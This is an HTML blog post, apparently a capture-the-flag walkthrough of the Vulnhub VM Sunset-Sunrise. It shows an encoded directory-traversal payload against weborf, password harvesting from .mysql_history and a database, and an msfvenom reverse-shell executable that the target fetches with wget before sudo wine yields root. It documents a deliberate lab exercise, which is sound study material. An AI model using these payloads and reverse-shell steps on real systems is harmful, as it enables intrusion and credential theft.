<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="../assets/js/navbar.js"></script><style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbar">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                Vulnhub: Sunset-Sunrise
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Jan, 2021
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Sunset-Sunrise</a></li>
        </ul>
      </nav>
<h3>Scanning:</h3>
<ul>
<li>Finding the machine on the network using nmap:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255

Nmap scan report for 192.168.56.135
Host is up (0.00014s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
</span></code></pre>
<ul>
<li>Getting more details about running services:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.135
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-07 13:32 EST
Nmap scan report for 192.168.56.135
Host is up (0.000067s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp   open  http       nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.56.1' is not allowed to connect to this MariaDB server
8080/tcp open  http-proxy Weborf (GNU/Linux)
| fingerprint-strings: 
</span></code></pre>
<h3>Web:</h3>
<ul>
<li>
<p>Always check web first</p>
</li>
<li>
<p>Index Page:</p>
<img src="images/sunrise1.png">
</li>
<li>On port 8080, we find weborf running:</li>
<img src="images/sunrise2.png">
<li>
<p>The weborf web application might have vulnerabilities</p>
</li>
<li>
<p>Searching for exploits using searchsploit:</p>
</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ searchsploit weborf
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
weborf 0.12.2 - Directory Traversal           | linux/remote/14925.txt
Weborf HTTP Server - Denial of Service        | multiple/dos/14012.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
</span></code></pre>
<ul>
<li>Proof of Concept for the Directory Traversal vulnerability:</li>
</ul>
<pre><code><span>Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
</span></code></pre>
<ul>
<li>Testing it out using the same command gives us the contents of /etc/passwd:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[SNIP]
sunrise:x:1000:1000:sunrise,,,:/home/sunrise:/bin/bash
[SNIP]
weborf:x:1001:1001:,,,:/home/weborf:/bin/bash
mysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false
crazyeights@es-base:~$ 
</span></code></pre>
<ul>
<li>There are two users with home folders: weborf and sunrise</li>
<li>When we checkout the content of sunrises home directory we can see the user flag: (cleaned up for clarity)</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f
[SNIP]
user.txt
</span></code></pre>
<p>Getting the user flag:</p>
<pre><code><span>crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2fuser.txt
a6050aecf6303b0b824038807d823a89
</span></code></pre>
<p>There is much less in the weborf home folder, only the weborf application directory (cleaned up for clarity)</p>
<pre><code><span>crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f
weborf-0.12.2/
</span></code></pre>
<ul>
<li>Since we cannot see hidden files or folders (beginning with ., ie. .ssh) we use dirb to look for them:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f
---- Scanning URL: http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/ ----
+ http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)                                                                                                                     
+ http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)                                                                                                                
[SNIP]
</span></code></pre>
<ul>
<li>We find interesting file: .mysql_history</li>
<li>When getting its contents we find the sql password for the user weborf:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ curl  http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f.mysql_history
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44'; 
</span></code></pre>
<h3>User:</h3>
<ul>
<li>It is also the password for SSH:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ ssh weborf@192.168.56.135
weborf@192.168.56.135's password: 
Linux sunrise 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  5 16:24:32 2019 from 192.168.1.146
weborf@sunrise:~$ 
</span></code></pre>
<ul>
<li>Check for additional user information in mysql since we know the password for the user weborf:</li>
<li>Using the database mysql, and the table user, the user sunrise has their password stored in plaintext:</li>
</ul>
<pre><code><span>weborf@sunrise:~$ mysql -u weborf -p'iheartrainbows44'
[SNIP]
| localhost | sunrise | thefutureissobrightigottawearshades       | N           | N           | N           
[SNIP]
MariaDB [mysql]&gt; 
</span></code></pre>
<ul>
<li>Login as the user sunrise:</li>
</ul>
<pre><code><span>weborf@sunrise:~$ su sunrise
Password: 
sunrise@sunrise:/home/weborf$ 
</span></code></pre>
<h3>Root:</h3>
<ul>
<li>Find programs the user sunrise can run with elevated privileges:</li>
</ul>
<pre><code><span>sunrise@sunrise:/home/weborf$ sudo -l
[sudo] password for sunrise: 
Matching Defaults entries for sunrise on sunrise:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunrise may run the following commands on sunrise:
    (root) /usr/bin/wine
</span></code></pre>
<ul>
<li>
<p>The user sunrise can run the wine command (windows emulator) with root privileges</p>
</li>
<li>
<p>Use msfvenom to create an executable containing a reverse shell:</p>
</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=1234 -f exe &gt;evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
crazyeights@es-base:~$ 
</span></code></pre>
<ul>
<li>Copy the exe to http server:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ sudo cp evil.exe /var/www/html/
[sudo] password for crazyeights: 
crazyeights@es-base:~$ sudo service apache2 start
crazyeights@es-base:~$
</span></code></pre>
<ul>
<li>Download on the target machine:</li>
</ul>
<pre><code><span>sunrise@sunrise:/tmp$ wget http://192.168.56.1/evil.exe
</span></code></pre>
<ul>
<li>Using msf with multi/handler for the listener, set the listening host, and port and run:</li>
</ul>
<pre><code><span>msf5 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set lhost 192.168.56.1
lhost =&gt; 192.168.56.1
msf5 exploit(multi/handler) &gt; set lport 1234
lport =&gt; 1234
msf5 exploit(multi/handler) &gt; run
</span></code></pre>
<ul>
<li>Run the exploit using wine as root:</li>
</ul>
<pre><code><span>sunrise@sunrise:/tmp$ sudo /usr/bin/wine evil.exe
</span></code></pre>
<ul>
<li>The reverse shell will connect to the listener, and we now have root privileges:</li>
</ul>
<pre><code><span>[*] Started reverse TCP handler on 192.168.56.1:1234 
[*] Sending stage (176195 bytes) to 192.168.56.135
[*] Meterpreter session 1 opened (192.168.56.1:1234 -&gt; 192.168.56.135:41564) at 2021-01-07 14:17:27 -0500
</span></code></pre>
<p>Checking uid:</p>
<pre><code><span>meterpreter &gt; getuid
Server username: sunrise\root

</span></code></pre>
<p>Get flag root/root.txt</p>
<pre><code><span>meterpreter &gt; cat root.txt 
[SNIP]
Thanks for playing! - Felipe Winsnes (@whitecr0wz)

24edb59d21c273c033aa6f1689b0b18c
meterpreter &gt; 
</span></code></pre>
<p>FIN.</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>